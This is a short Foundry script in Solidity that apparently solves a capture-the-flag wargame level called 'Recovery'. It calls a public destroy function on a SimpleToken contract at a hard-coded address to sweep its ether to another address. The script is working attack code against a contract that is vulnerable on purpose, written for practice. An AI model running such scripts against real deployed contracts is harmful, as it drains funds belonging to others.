//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

import {Script, console} from "forge-std/Script.sol";
import {Recovery, SimpleToken} from "../src/Recovery.sol";

contract AttackRecoveryScript is Script {
    SimpleToken target;
    address constant instance = 0x4e2574CaA5cABc7c57b3983aeEd6168f83581B6a;

    function run() external {
        //Attack
        vm.startBroadcast();
        _attack();
        vm.stopBroadcast();
    }

    function _attack() internal {
        target = SimpleToken(payable(0x4f7053D00f30172589D4887953919Ea7bdE1b07D));
        target.destroy(payable(instance));
    }
}
